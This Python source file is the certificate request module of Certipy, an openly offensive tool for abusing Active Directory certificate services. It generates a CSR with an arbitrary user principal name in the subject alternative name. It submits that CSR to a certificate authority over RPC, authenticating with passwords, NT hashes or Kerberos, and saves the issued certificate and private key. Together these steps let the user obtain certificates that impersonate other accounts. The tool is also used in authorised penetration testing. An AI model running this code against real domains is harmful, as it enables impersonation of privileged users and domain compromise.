# Certipy - Active Directory certificate abuse
#
# Description:
#   Request a new certificate
#
# Authors:
#   @ly4k (https://github.com/ly4k)
#
# References:
#   https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-icpr/d98e6cfb-87ba-4915-b3ec-a1b7c6129a53
#   https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/d6bee093-d862-4122-8f2b-7b49102097dc
#   https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-icpr/0c6f150e-3ead-4006-b37f-ebbf9e2cf2e7
#   https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-icpr/0c6f150e-3ead-4006-b37f-ebbf9e2cf2e7
#   https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/ea9ef420-4cbf-44bc-b093-c4175139f90f
#   https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-icpr/9f0b251b-c722-4851-9a45-4e912660b458
#   https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/13b7f3f7-c809-4c1e-97fd-52f2ed044c7e
#   https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-icpr/0c6f150e-3ead-4006-b37f-ebbf9e2cf2e
#


import argparse
import logging
from typing import Tuple

from asn1crypto import algos, core, csr, keys, x509

try:
    from Cryptodome.Hash import SHA256
    from Cryptodome.PublicKey import RSA
    from Cryptodome.Signature import PKCS1_v1_5
except ImportError:
    from Crypto.Hash import SHA256
    from Crypto.PublicKey import RSA
    from Crypto.Signature import PKCS1_v1_5

from impacket import hresult_errors, ntlm
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.dtypes import DWORD, LPWSTR, PBYTE, ULONG
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
from impacket.dcerpc.v5.nrpc import checkNullString
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.smbconnection import SMBConnection
from impacket.uuid import string_to_bin

from certipy.pkinit import upn_from_certificate
from certipy.target import Target

# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-icpr/d98e6cfb-87ba-4915-b3ec-a1b7c6129a53
MSRPC_UUID_ICPR = string_to_bin("91ae6020-9e3c-11cf-8d7c-00aa00c091be")


class DCERPCSessionError(DCERPCException):
    def __init__(self, error_string=None, error_code=None, packet=None):
        DCERPCException.__init__(self, error_string, error_code, packet)

    def __str__(self):
        key = self.error_code
        if key in hresult_errors.ERROR_MESSAGES:
            error_msg_short = hresult_errors.ERROR_MESSAGES[key][0]
            error_msg_verbose = hresult_errors.ERROR_MESSAGES[key][1]
            return "Cert SessionError: code: 0x%x - %s - %s" % (
                self.error_code,
                error_msg_short,
                error_msg_verbose,
            )
        else:
            return "Cert SessionError: unknown error code: 0x%x" % self.error_code


# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/d6bee093-d862-4122-8f2b-7b49102097dc
class CERTTRANSBLOB(NDRSTRUCT):
    structure = (
        ("cb", ULONG),
        ("pb", PBYTE),
    )


# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-icpr/0c6f150e-3ead-4006-b37f-ebbf9e2cf2e7
class CertServerRequest(NDRCALL):
    opnum = 0
    structure = (
        ("dwFlags", DWORD),
        ("pwszAuthority", LPWSTR),
        ("pdwRequestId", DWORD),
        ("pctbAttribs", CERTTRANSBLOB),
        ("pctbRequest", CERTTRANSBLOB),
    )


# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-icpr/0c6f150e-3ead-4006-b37f-ebbf9e2cf2e7
class CertServerRequestResponse(NDRCALL):
    structure = (
        ("pdwRequestId", DWORD),
        ("pdwDisposition", ULONG),
        ("pctbCert", CERTTRANSBLOB),
        ("pctbEncodedCert", CERTTRANSBLOB),
        ("pctbDispositionMessage", CERTTRANSBLOB),
    )


def create_csr(username: str, alt_name: str = None) -> Tuple[bytes, "RSA.RsaKey"]:
    logging.info("Generating RSA key")
    rsa_key = RSA.generate(2048)

    certification_request = csr.CertificationRequest()

    certification_request_info = csr.CertificationRequestInfo(
        {
            "version": csr.Version("v1"),
        }
    )

    # TODO: Create the subject from the DN of the user
    subject = x509.Name.build({"common_name": username})

    certification_request_info["subject"] = subject

    certification_request_info["subject_pk_info"] = keys.PublicKeyInfo.wrap(
        keys.RSAPublicKey({"modulus": rsa_key.n, "public_exponent": rsa_key.e}), "rsa"
    )

    if alt_name is not None:
        # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/ea9ef420-4cbf-44bc-b093-c4175139f90f
        extensions = x509.Extensions(
            [
                x509.Extension(
                    {
                        "extn_id": "subject_alt_name",
                        "extn_value": x509.GeneralNames(
                            [
                                x509.GeneralName(
                                    "other_name",
                                    {
                                        "type_id": "1.3.6.1.4.1.311.20.2.3",
                                        "value": core.UTF8String(alt_name).retag(
                                            {
                                                "explicit": 0,
                                                "optional": True,
                                            }
                                        ),
                                    },
                                )
                            ]
                        ),
                    }
                )
            ]
        )
        attributes = csr.CRIAttributes(
            [
                csr.CRIAttribute(
                    {
                        "type": "extension_request",
                        "values": csr.SetOfExtensions([extensions]),
                    }
                )
            ]
        )

        certification_request_info["attributes"] = attributes

    certification_request["certification_request_info"] = certification_request_info

    certification_request["signature_algorithm"] = algos.SignedDigestAlgorithm(
        {"algorithm": "sha256_rsa"}
    )

    hashvalue = SHA256.new(certification_request["certification_request_info"].dump())
    signer = PKCS1_v1_5.new(rsa_key)
    signature = signer.sign(hashvalue)

    certification_request["signature"] = signature

    return (
        certification_request.dump(),
        rsa_key,
    )


class Request:
    def __init__(self, options: argparse.Namespace, target: Target = None):
        self.options = options

        if target is None:
            self.target = Target(options)
        else:
            self.target = target

        self.certificate = None
        self.key = None

    def connect(self):
        target = self.target

        logging.debug(
            "Connecting to SMB at %s (%s)"
            % (repr(target.remote_name), target.target_ip)
        )
        smb_connection = SMBConnection(target.remote_name, target.target_ip)

        if not target.do_kerberos:
            smb_connection.login(
                target.username,
                target.password,
                target.domain,
                target.lmhash,
                target.nthash,
            )
        else:
            smb_connection.kerberosLogin(
                target.username,
                target.password,
                target.domain,
                target.lmhash,
                target.nthash,
                kdcHost=target.dc_ip,
            )

        # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-icpr/9f0b251b-c722-4851-9a45-4e912660b458
        rpc = transport.DCERPCTransportFactory("ncacn_np:445[\\pipe\\cert]")
        rpc.set_smb_connection(smb_connection)

        dce = rpc.get_dce_rpc()
        dce.set_auth_level(ntlm.NTLM_AUTH_PKT_PRIVACY)
        dce.connect()

        dce.bind(MSRPC_UUID_ICPR)

        self.dce = dce

    def run(self):
        self.connect()

        alt_name = self.options.alt
        if alt_name is None:
            alt_name = self.target.username

        csr, rsa_key = create_csr(self.target.username, alt_name=alt_name)

        # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/13b7f3f7-c809-4c1e-97fd-52f2ed044c7e
        attributes = ["CertificateTemplate:%s" % self.options.template]

        if alt_name is not None:
            attributes.append("SAN:upn=%s" % alt_name)

        attributes = checkNullString("\n".join(attributes)).encode("utf-16le")

        attribs = CERTTRANSBLOB()
        attribs["cb"] = len(attributes)
        attribs["pb"] = attributes

        pctb_request = CERTTRANSBLOB()
        pctb_request["cb"] = len(csr)
        pctb_request["pb"] = csr

        request = CertServerRequest()
        request["dwFlags"] = 0
        request["pwszAuthority"] = checkNullString(self.options.ca)
        request["pdwRequestId"] = 0
        request["pctbAttribs"] = attribs
        request["pctbRequest"] = pctb_request

        logging.info("Requesting certificate")
        resp = self.dce.request(request)

        return_code = resp["pdwDisposition"]

        # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-icpr/0c6f150e-3ead-4006-b37f-ebbf9e2cf2e7
        if return_code == 5:
            logging.warning("Request is pending approval")
            return False
        elif return_code != 3:
            if return_code not in hresult_errors.ERROR_MESSAGES:
                logging.error(
                    "Got unknown error while requesting certificate: %#x" % return_code
                )
                return False

            error_msg_short = hresult_errors.ERROR_MESSAGES[return_code][0]
            error_msg_verbose = hresult_errors.ERROR_MESSAGES[return_code][1]
            logging.error(
                "Got error while requesting certificate: code: %#x - %s - %s"
                % (
                    return_code,
                    error_msg_short,
                    error_msg_verbose,
                )
            )

            return False

        request_id = resp["pdwRequestId"]
        certificate = x509.Certificate.load(b"".join(resp["pctbEncodedCert"]["pb"]))

        try:
            # Some certificates does not contain a UPN
            upn = upn_from_certificate(certificate)

            logging.info("Got certificate with UPN %s" % repr(upn))
        except Exception:
            logging.info("Got certificate")

        with open("%i.crt" % request_id, "wb") as f:
            f.write(certificate.dump())
        logging.info("Saved certificate to '%i.crt'" % request_id)

        with open("%i.key" % request_id, "wb") as f:
            f.write(rsa_key.export_key("DER"))
        logging.info("Saved private key to '%i.key'" % request_id)

        self.certificate = certificate
        self.key = rsa_key

        return True


def request(options: argparse.Namespace):
    req = Request(options)
    req.run()
